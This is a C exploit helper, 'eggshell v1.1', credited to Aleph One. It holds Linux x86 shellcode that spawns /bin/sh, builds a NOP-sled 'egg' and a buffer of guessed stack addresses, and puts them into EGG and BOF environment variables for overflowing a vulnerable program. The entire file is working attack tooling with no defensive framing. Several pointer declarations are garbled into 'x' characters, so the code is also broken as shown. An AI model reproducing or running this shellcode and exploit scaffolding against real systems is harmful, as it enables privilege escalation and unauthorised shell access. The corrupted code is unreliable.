/*
 * eggshell v1.1
 *
 * Aleph One / aleph1@underground.org
 * Edited by superdk@hanmail.net
 */

#include <stdio.h>

#define DEFAULT_OFFSET 0
#define DEFAULT_BUFFER_SIZE 512
#define DEFAULT_EGG_SIZE 2048
#define NOP 0x90
#define NOP_SIZE 4

char shellcode[] =
	"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
	"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
	"\x80\xe8\xdc\xff\xff\xff/bin/sh";

unsigned long get_sp(void) {
	__asm__("movl %esp,%eax");
}

int main(int argc, char xargv[]) {
	char xptr, xbof, xegg;
	long xaddr_ptr, addr;
	int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
	int i, n, m, c, align=0, eggsize=DEFAULT_EGG_SIZE;
	
	if (strlen(shellcode) > eggsize) {
		printf("Shellcode is larger the the egg.\n");
		exit(0);
	}

	if (!(bof = malloc(bsize))) {
		printf("Can't allocate memory.\n");
		exit(0);
	}
	
	if (!(egg = malloc(eggsize))) {
		printf("Can't allocate memory.\n");
		exit(0);
	}
	
	addr = get_sp( ) - offset;
	printf("[ Address:\t0x%x\tOffset:\t\t%d\t\t\t\t]\n", addr, offset);
	addr_ptr = (long x) bof;
	for (i = 0; i < bsize; i+=4)
		*(addr_ptr++) = addr;
	ptr = egg;
	for (i = 0; i <= eggsize - strlen(shellcode) - NOP_SIZE; i += NOP_SIZE)
		for (n = 0; n < NOP_SIZE; n++) {
			m = (n + align) % NOP_SIZE;
			*(ptr++) = NOP;
		}
	for (i = 0; i < strlen(shellcode); i++)
		*(ptr++) = shellcode[i];
	bof[bsize - 1] = '\0';
	egg[eggsize - 1] = '\0';
	memcpy(egg,"EGG=",4);
	putenv(egg);
	memcpy(bof,"BOF=",4);
	putenv(bof);
	system("/bin/sh");
}